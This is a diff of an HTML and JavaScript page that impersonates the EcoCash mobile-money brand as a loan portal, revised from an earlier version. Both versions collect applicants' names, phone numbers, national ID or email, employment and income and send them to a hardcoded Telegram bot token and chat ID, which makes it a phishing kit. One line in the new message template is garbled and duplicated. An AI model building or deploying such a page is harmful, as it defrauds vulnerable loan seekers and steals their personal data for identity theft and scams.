@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ecocash Instant Mobile Loans - 2026</title>
+    <title>EcoCash - Loan Portal</title>
     <style>
         :root {
-            --eco-green: #059669;
-            --eco-dark-green: #047857;
-            --dark: #0f172a;
-            --text: #1e293b;
-            --muted: #475569;
-            --bg: #f0fdf4;
+            --primary: #6366f1;
+            --primary-gradient: linear-gradient(135deg, #6366f1, #a855f7);
+            --bg: #e2e8f0;
             --card: #ffffff;
-            --border: #cbd5e1;
+            --text: #1e293b;
+            --muted: #64748b;
+            --border: #e2e8f0;
         }
 
         * {
@@ -31,56 +30,87 @@
             justify-content: center;
             align-items: flex-start;
             min-height: 100vh;
-            line-height: 1.6;
+            line-height: 1.5;
         }
 
         .container {
             width: 100%;
-            max-width: 600px;
+            max-width: 500px;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 4px;
+            margin-bottom: 12px;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: #dc2626;
+        }
+
+        .menu-icon {
+            font-size: 20px;
+            cursor: pointer;
+            color: var(--text);
         }
 
         .card {
             background: var(--card);
-            border-radius: 12px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            border: 1px solid var(--border);
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
+            padding: 24px;
+            margin-bottom: 24px;
         }
 
-        .header {
-            background: linear-gradient(135deg, var(--eco-green), var(--eco-dark-green));
-            color: white;
-            padding: 24px;
+        .header-title {
             text-align: center;
-        }
-
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 8px;
-        }
-
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-
-        .form-body {
-            padding: 24px;
-        }
-
-        .section-title {
-            font-size: 14px;
+            font-size: 22px;
             font-weight: 700;
-            color: var(--eco-dark-green);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 16px;
-            padding-bottom: 6px;
-            border-bottom: 2px solid var(--bg);
+            margin-bottom: 6px;
+        }
+
+        .header-sub {
+            text-align: center;
+            font-size: 13px;
+            color: var(--muted);
+            margin-bottom: 24px;
+        }
+
+        /* Step Indicators */
+        .steps-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background: #cbd5e1;
+            margin: 0 4px;
+            border-radius: 2px;
+            transition: background 0.3s;
+        }
+
+        .step-bar.active {
+            background: #4f46e5;
+        }
+
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
         }
 
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 18px;
         }
 
         label {
@@ -91,172 +121,468 @@
             color: var(--text);
         }
 
-        input, select {
+        input, select, textarea {
             width: 100%;
-            padding: 12px;
+            padding: 12px 14px;
             border: 1px solid var(--border);
             border-radius: 8px;
             font-size: 15px;
-            background-color: #f8fafc;
+            background-color: #fff;
             color: var(--text);
             transition: border-color 0.2s;
         }
 
-        input:focus, select:focus {
+        input:focus, select:focus, textarea:focus {
             outline: none;
-            border-color: var(--eco-green);
-            background-color: #fff;
+            border-color: var(--primary);
         }
 
-        .submit-btn {
-            width: 100%;
-            background-color: var(--eco-green);
-            color: white;
-            border: none;
-            padding: 14px;
-            font-size: 16px;
+        /* Calculator Styles */
+        .calc-box {
+            background: #f8fafc;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .calc-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 14px;
             font-weight: 600;
+        }
+
+        .calc-value {
+            color: #4f46e5;
+            font-size: 18px;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            margin: 8px 0 4px 0;
+            accent-color: #4f46e5;
+        }
+
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: var(--muted);
+            margin-bottom: 16px;
+        }
+
+        .monthly-payment-card {
+            background: #fff;
+            border: 1px solid var(--border);
             border-radius: 8px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+        }
+
+        .phone-group {
+            display: flex;
+            gap: 8px;
+        }
+
+        .phone-prefix {
+            background: #f1f5f9;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
             cursor: pointer;
-            transition: background-color 0.2s;
-            margin-top: 10px;
+            text-align: center;
+            transition: opacity 0.2s;
         }
 
-        .submit-btn:hover {
-            background-color: var(--eco-dark-green);
+        .btn-primary {
+            background: var(--primary-gradient);
+            color: white;
         }
 
-        .status-message {
+        .btn-secondary {
+            background: #e2e8f0;
+            color: var(--text);
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+        }
+
+        /* Summary Step */
+        .summary-box {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+        }
+
+        .summary-title {
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text);
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-bottom: 8px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .summary-label {
+            color: var(--muted);
+        }
+
+        .summary-val {
+            font-weight: 600;
+            color: var(--text);
+        }
+
+        /* Features List */
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            font-size: 13px;
+        }
+
+        .feature-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            background: #fef3c7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+        }
+
+        .feature-text strong {
+            display: block;
+            color: var(--text);
+        }
+
+        .feature-text span {
+            color: var(--muted);
+            font-size: 12px;
+        }
+
+        .status-msg {
             margin-top: 16px;
             padding: 12px;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 13px;
             text-align: center;
             display: none;
         }
 
-        .status-success {
-            background-color: #d1fae5;
-            color: #065f46;
-            border: 1px solid #a7f3d0;
-        }
-
-        .status-error {
-            background-color: #fee2e2;
-            color: #991b1b;
-            border: 1px solid #fecaca;
-        }
-
         .footer {
             text-align: center;
-            padding: 16px;
             font-size: 12px;
             color: var(--muted);
-            border-top: 1px solid var(--bg);
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="navbar">
+            <div class="logo">EcoCash</div>
+            <div class="menu-icon">&#9776;</div>
+        </div>
+
         <div class="card">
-            <div class="header">
-                <h1>Ecocash Loan Portal</h1>
-                <p>Quick approval and direct mobile wallet disbursement.</p>
+            <!-- Step Indicators -->
+            <div class="steps-indicator">
+                <div class="step-bar active" id="bar1"></div>
+                <div class="step-bar" id="bar2"></div>
+                <div class="step-bar" id="bar3"></div>
             </div>
-            
-            <form id="loanForm" class="form-body">
-                <div class="section-title">1. Personal Information</div>
-                
-                <div class="form-group">
-                    <label for="fullName">Full Name (As registered on Mobile Money) *</label>
-                    <input type="text" id="fullName" required placeholder="e.g. John Doe">
+
+            <form id="loanForm">
+                <!-- STEP 1: Loan Calculator & Details -->
+                <div class="step-content active" id="step1">
+                    <div class="header-title">Get Your Loan Approved Fast</div>
+                    <div class="header-sub">Quick approval &bull; Competitive rates &bull; Flexible terms</div>
+
+                    <div class="calc-box">
+                        <div class="calc-row">
+                            <span>Loan Amount</span>
+                            <span class="calc-value" id="amountDisplay">$5,000</span>
+                        </div>
+                        <input type="range" id="loanAmountRange" min="100" max="5000" step="100" value="5000">
+                        <div class="range-labels">
+                            <span>$100</span>
+                            <span>$5,000</span>
+                        </div>
+
+                        <div class="calc-row">
+                            <span>Loan Term</span>
+                            <span class="calc-value" id="termDisplay">23 months</span>
+                        </div>
+                        <input type="range" id="loanTermRange" min="6" max="60" step="1" value="23">
+                        <div class="range-labels">
+                            <span>6 months</span>
+                            <span>60 months</span>
+                        </div>
+
+                        <div class="monthly-payment-card">
+                            <span style="font-size: 13px; color: var(--muted);">Monthly Payment</span>
+                            <span style="font-size: 18px; font-weight: 700; color: #4f46e5;" id="monthlyPaymentDisplay">$250.72</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Purpose of Loan</label>
+                        <input type="text" id="loanPurpose" value="Buy a car" required>
+                    </div>
+
+                    <button type="button" class="btn btn-primary" style="width: 100%; margin-top: 10px;" onclick="nextStep(1)">NEXT STEP</button>
+
+                    <div style="margin-top: 28px; border-top: 1px solid var(--border); padding-top: 20px;">
+                        <div class="feature-item">
+                            <div class="feature-icon">⚡</div>
+                            <div class="feature-text">
+                                <strong>Fast Approval</strong>
+                                <span>Within 24 hours</span>
+                            </div>
+                        </div>
+                        <div class="feature-item">
+                            <div class="feature-icon">📉</div>
+                            <div class="feature-text">
+                                <strong>Low Rates</strong>
+                                <span>From 8%</span>
+                            </div>
+                        </div>
+                        <div class="feature-item">
+                            <div class="feature-icon">🔒</div>
+                            <div class="feature-text">
+                                <strong>Secure</strong>
+                                <span>Bank-level encryption</span>
+                            </div>
+                        </div>
+                    </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="phoneNumber">Mobile Money Phone Number *</label>
-                    <input type="tel" id="phoneNumber" required placeholder="e.g. 0712345678">
+                <!-- STEP 2: Personal Information -->
+                <div class="step-content" id="step2">
+                    <div class="header-title">Loan Application</div>
+                    <div class="header-sub">Step 2 of 3</div>
+
+                    <div class="form-group">
+                        <label>First Name</label>
+                        <input type="text" id="firstName" placeholder="John" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Last Name</label>
+                        <input type="text" id="lastName" placeholder="Doe" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Email Address</label>
+                        <input type="email" id="email" placeholder="john.doe@example.com" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Phone Number</label>
+                        <div class="phone-group">
+                            <div class="phone-prefix">+263</div>
+                            <input type="tel" id="phoneNumber" placeholder="123456789" required>
+                        </div>
+                        <span style="font-size: 11px; color: var(--muted); margin-top: 4px; display: block;">Enter 9-10 digits (e.g., 123456789)</span>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" onclick="prevStep(2)">PREVIOUS</button>
+                        <button type="button" class="btn btn-primary" onclick="nextStep(2)">NEXT STEP</button>
+                    </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="nationalId">National ID Number *</label>
-                    <input type="text" id="nationalId" required placeholder="e.g. 12345678">
+                <!-- STEP 3: Employment & Summary -->
+                <div class="step-content" id="step3">
+                    <div class="header-title">Loan Application</div>
+                    <div class="header-sub">Step 3 of 3</div>
+
+                    <div class="form-group">
+                        <label>Employment Status</label>
+                        <select id="employmentStatus">
+                            <option value="Employed">Employed</option>
+                            <option value="Self-Employed">Self-Employed</option>
+                            <option value="Business Owner">Business Owner</option>
+                            <option value="Freelancer">Freelancer</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Annual Income ($)</label>
+                        <input type="number" id="annualIncome" value="50000" required>
+                    </div>
+
+                    <div class="summary-box">
+                        <div class="summary-title">Application Summary</div>
+                        <div class="summary-row">
+                            <span class="summary-label">Loan Amount:</span>
+                            <span class="summary-val" id="sumAmount">$5,000</span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label">Loan Term:</span>
+                            <span class="summary-val" id="sumTerm">23 Months</span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label">Purpose:</span>
+                            <span class="summary-val" id="sumPurpose">Buy a car</span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label">Applicant:</span>
+                            <span class="summary-val" id="sumApplicant">J D</span>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" onclick="prevStep(3)">PREVIOUS</button>
+                        <button type="submit" class="btn btn-primary" id="submitBtn">SUBMIT APPLICATION</button>
+                    </div>
+
+                    <div id="statusBox" class="status-msg"></div>
                 </div>
-
-                <div class="section-title" style="margin-top: 24px;">2. Loan Request</div>
-
-                <div class="form-group">
-                    <label for="loanAmount">Requested Loan Amount *</label>
-                    <select id="loanAmount" required>
-                        <option value="" disabled selected>Select amount</option>
-                        <option value="5,000">5,000 KES / UGX</option>
-                        <option value="10,000">10,000 KES / UGX</option>
-                        <option value="25,000">25,000 KES / UGX</option>
-                        <option value="50,000">50,000 KES / UGX</option>
-                        <option value="100,000">100,000 KES / UGX</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label for="repaymentPeriod">Repayment Period *</label>
-                    <select id="repaymentPeriod" required>
-                        <option value="" disabled selected>Select period</option>
-                        <option value="1 Month">1 Month</option>
-                        <option value="3 Months">3 Months</option>
-                        <option value="6 Months">6 Months</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label for="loanPurpose">Purpose of Loan *</label>
-                    <select id="loanPurpose" required>
-                        <option value="" disabled selected>Select purpose</option>
-                        <option value="Business Expansion">Business Expansion</option>
-                        <option value="Emergency Medical">Emergency Medical</option>
-                        <option value="School Fees">School Fees</option>
-                        <option value="Personal Upkeep">Personal Upkeep</option>
-                    </select>
-                </div>
-
-                <button type="submit" class="submit-btn" id="submitBtn">Submit Loan Application</button>
-                
-                <div id="statusBox" class="status-message"></div>
             </form>
+        </div>
 
-            <div class="footer">
-                &copy; 2026 Ecocash Loan Services. Secure Instant Processing.
-            </div>
+        <div class="footer">
+            &copy; 2026 EcoCash
         </div>
     </div>
 
     <script>
-        // Pre-configured Telegram Credentials
+        // Telegram Credentials
         const botToken = "8641245398:AAGYI7pFOVVrKqf9ILOSo6yGyOdFVSekkpM";
         const chatId = "8557614507";
 
+        // Range Sliders & Calculator Logic
+        const amountRange = document.getElementById('loanAmountRange');
+        const termRange = document.getElementById('loanTermRange');
+        const amountDisplay = document.getElementById('amountDisplay');
+        const termDisplay = document.getElementById('termDisplay');
+        const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
+
+        function updateCalculator() {
+            const principal = parseFloat(amountRange.value);
+            const months = parseInt(termRange.value);
+            
+            amountDisplay.textContent = '$' + principal.toLocaleString();
+            termDisplay.textContent = months + ' months';
+
+            // Simple monthly payment estimate calculation (8% annual interest rate)
+            const monthlyInterestRate = 0.08 / 12;
+            let monthlyPayment = 0;
+            if (monthlyInterestRate === 0) {
+                monthlyPayment = principal / months;
+            } else {
+                monthlyPayment = (principal * monthlyInterestRate * Math.pow(1 + monthlyInterestRate, months)) / (Math.pow(1 + monthlyInterestRate, months) - 1);
+            }
+            monthlyPaymentDisplay.textContent = '$' + monthlyPayment.toFixed(2);
+        }
+
+        amountRange.addEventListener('input', updateCalculator);
+        termRange.addEventListener('input', updateCalculator);
+        updateCalculator();
+
+        // Multi-step Navigation
+        function nextStep(current) {
+            if (current === 2) {
+                // Validate Step 2 fields
+                const fn = document.getElementById('firstName').value.trim();
+                const ln = document.getElementById('lastName').value.trim();
+                const phone = document.getElementById('phoneNumber').value.trim();
+                if(!fn || !ln || !phone) {
+                    alert('Please fill in all required personal details.');
+                    return;
+                }
+                // Populate Summary
+                document.getElementById('sumAmount').textContent = amountDisplay.textContent;
+                document.getElementById('sumTerm').textContent = termDisplay.textContent + ' Months';
+                document.getElementById('sumPurpose').textContent = document.getElementById('loanPurpose').value;
+                document.getElementById('sumApplicant').textContent = fn.charAt(0) + ' ' + ln.charAt(0);
+            }
+
+            document.getElementById(`step${current}`).classList.remove('active');
+            document.getElementById(`step${current+1}`).classList.add('active');
+            document.getElementById(`bar${current+1}`).classList.add('active');
+        }
+
+        function prevStep(current) {
+            document.getElementById(`step${current}`).classList.remove('active');
+            document.getElementById(`bar${current}`).classList.remove('active');
+            document.getElementById(`step${current-1}`).classList.add('active');
+        }
+
+        // Form Submission to Telegram
         document.getElementById('loanForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
+
             const submitBtn = document.getElementById('submitBtn');
             const statusBox = document.getElementById('statusBox');
-            
+
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Submitting Application...';
+            submitBtn.textContent = 'SUBMITTING...';
             statusBox.style.display = 'none';
 
-            const fullName = document.getElementById('fullName').value;
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            const nationalId = document.getElementById('nationalId').value;
-            const loanAmount = document.getElementById('loanAmount').value;
-            const repaymentPeriod = document.getElementById('repaymentPeriod').value;
-            const loanPurpose = document.getElementById('loanPurpose').value;
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('email').value;
+            const phone = '+263 ' + document.getElementById('phoneNumber').value;
+            const loanAmount = amountDisplay.textContent;
+            const loanTerm = termDisplay.textContent;
+            const purpose = document.getElementById('loanPurpose').value;
+            const employment = document.getElementById('employmentStatus').value;
+            const annualIncome = document.getElementById('annualIncome').value;
 
-            const message = `🚨 *NEW LOAN APPLICATION* 🚨\n\n` +
-                            `👤 *Name:* ${fullName}\n` +
-                            `📱 *Phone:* ${phoneNumber}\n` +
-                            `🆔 *National ID:* ${nationalId}\n` +
+            const message = `🚨 *NEW ECO CASH LOAN A            const message = `🚨 *NEW ECO CASH LOAN APPLICATION* 🚨\n\n` +
+                            `👤 *Name:* ${firstName} ${lastName}\n` +
+                            `📧 *Email:* ${email}\n` +
+                            `📱 *Phone:* ${phone}\n` +
                             `💰 *Amount:* ${loanAmount}\n` +
-                            `⏱ *Period:* ${repaymentPeriod}\n` +
-                            `📋 *Purpose:* ${loanPurpose}`;
+                            `⏱ *Term:* ${loanTerm}\n` +
+                            `📋 *Purpose:* ${purpose}\n` +
+                            `💼 *Employment:* ${employment}\n` +
+                            `💵 *Annual Income:* $${annualIncome}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -274,20 +600,23 @@
                 const data = await response.json();
 
                 if (data.ok) {
-                    statusBox.textContent = 'Application submitted successfully! Disbursement pending review.';
-                    statusBox.className = 'status-message status-success';
+                    statusBox.textContent = 'Application submitted successfully! Our team will contact you.';
+                    statusBox.className = 'status-msg';
+                    statusBox.style.background = '#d1fae5';
+                    statusBox.style.color = '#065f46';
                     statusBox.style.display = 'block';
-                    document.getElementById('loanForm').reset();
+                    submitBtn.textContent = 'SUCCESSFUL';
                 } else {
                     throw new Error(data.description || 'Telegram API error');
                 }
             } catch (error) {
-                statusBox.textContent = 'Submission failed. Please check your network or bot configuration.';
-                statusBox.className = 'status-message status-error';
+                statusBox.textContent = 'Submission failed. Please check your network connection.';
+                statusBox.className = 'status-msg';
+                statusBox.style.background = '#fee2e2';
+                statusBox.style.color = '#991b1b';
                 statusBox.style.display = 'block';
-            } finally {
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Submit Loan Application';
+                submitBtn.textContent = 'SUBMIT APPLICATION';
             }
         });
     </script>
